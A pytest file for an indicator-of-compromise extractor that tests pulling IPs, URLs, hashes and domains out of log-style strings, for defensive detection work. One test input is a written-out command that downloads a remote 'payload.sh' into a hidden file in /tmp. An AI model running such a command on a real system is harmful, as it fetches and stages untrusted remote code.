from ioc_extractor import extract_iocs, extract_iocs_as_dicts


def test_empty_input_returns_nothing():
    assert extract_iocs("") == []
    assert extract_iocs(None) == []


def test_extracts_external_ip_with_nonzero_risk():
    iocs = extract_iocs("connection from 203.0.113.7 attempted login")
    ips = [i for i in iocs if i.ip == "203.0.113.7"]
    assert len(ips) == 1
    assert ips[0].risk_score > 0


def test_private_ip_scored_zero():
    iocs = extract_iocs("internal heartbeat to 10.0.0.5")
    ips = [i for i in iocs if i.ip == "10.0.0.5"]
    assert len(ips) == 1
    assert ips[0].risk_score == 0


def test_extracts_url():
    iocs = extract_iocs("wget http://185.220.101.5/payload.sh -O /tmp/.x")
    urls = [i for i in iocs if i.url]
    assert any("payload.sh" in i.url for i in urls)


def test_extracts_sha256_not_misclassified_as_sha1_or_md5():
    sha256 = "a" * 64
    iocs = extract_iocs(f"dropped file hash {sha256}")
    hashes = [i for i in iocs if i.hash]
    assert len(hashes) == 1
    assert hashes[0].hash_type == "sha256"
    assert hashes[0].hash == sha256


def test_extracts_md5_distinct_from_sha1():
    md5 = "b" * 32
    sha1 = "c" * 40
    iocs = extract_iocs(f"md5={md5} sha1={sha1}")
    hash_types = {i.hash_type for i in iocs if i.hash}
    assert hash_types == {"md5", "sha1"}


def test_domain_allowlist_excludes_infra_hostnames():
    iocs = extract_iocs("connecting to elasticsearch and redis internally")
    domains = [i.domain for i in iocs if i.domain]
    assert "elasticsearch" not in domains
    assert "redis" not in domains


def test_as_dicts_shape():
    dicts = extract_iocs_as_dicts("attacker at 198.51.100.23")
    assert dicts
    for d in dicts:
        assert set(d.keys()) == {"ip", "domain", "url", "hash", "hash_type", "risk_score", "tags"}
